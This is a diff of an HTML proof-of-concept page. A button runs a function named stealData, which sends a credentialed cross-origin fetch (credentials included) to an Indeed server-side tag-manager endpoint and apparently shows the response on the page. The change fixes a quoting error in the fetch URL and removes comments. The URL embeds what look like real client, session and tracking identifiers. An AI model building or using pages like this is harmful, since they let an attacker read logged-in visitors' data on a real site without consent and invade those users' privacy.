@@ -10,10 +10,9 @@
 
   <pre id="output">Waiting...</pre>
 
-  <!-- Define your script AFTER the HTML elements -->
   <script>
     function stealData() {
-      fetch(""https://sgtm.indeed.com/g/collect?v=2&tid=G-LYNT3BTHPG&gtm=45he56u2v9177698153z89177627461za204zb9177627461&_p=1751467350027&gcs=G111&gcd=13t3t3t2t5l1&npa=0&dma_cps=syphamo&dma=1&tag_exp=101509157~103116026~103200004~103233427~103351869~103351871~104684208~104684211~104718208~104839054~104839056~104908321~104908323&cid=251017668.1751444497&ecid=504031357&ul=en-us&sr=1920x946&ur=&frm=0&pscdl=noapi&_eu=AAAAAAQ&sst.rnd=807904669.1751467354&sst.tft=1751467350027&sst.lpc=267066641&sst.navt=n&sst.ude=0&sst.sw_exp=1&_s=1&sid=1751467353&sct=2&seg=0&dl=https%3A%2F%2Fng.indeed.com%2F%3Fr%3Dus&dt=Job%20Search%20%7C%20Indeed&_tu=BA&en=page_view&_ss=2&tfd=12238&richsstsse", {
+      fetch("https://sgtm.indeed.com/g/collect?v=2&tid=G-LYNT3BTHPG&gtm=45he56u2v9177698153z89177627461za204zb9177627461&_p=1751467350027&gcs=G111&gcd=13t3t3t2t5l1&npa=0&dma_cps=syphamo&dma=1&tag_exp=101509157~103116026~103200004~103233427~103351869~103351871~104684208~104684211~104718208~104839054~104839056~104908321~104908323&cid=251017668.1751444497&ecid=504031357&ul=en-us&sr=1920x946&ur=&frm=0&pscdl=noapi&_eu=AAAAAAQ&sst.rnd=807904669.1751467354&sst.tft=1751467350027&sst.lpc=267066641&sst.navt=n&sst.ude=0&sst.sw_exp=1&_s=1&sid=1751467353&sct=2&seg=0&dl=https%3A%2F%2Fng.indeed.com%2F%3Fr%3Dus&dt=Job%20Search%20%7C%20Indeed&_tu=BA&en=page_view&_ss=2&tfd=12238&richsstsse", {
         method: "GET",
         credentials: "include"
       })
@@ -31,7 +30,6 @@
       });
     }
 
-    // Attach event listener after DOM is loaded
     document.getElementById("runBtn").addEventListener("click", stealData);
   </script>
 </body>
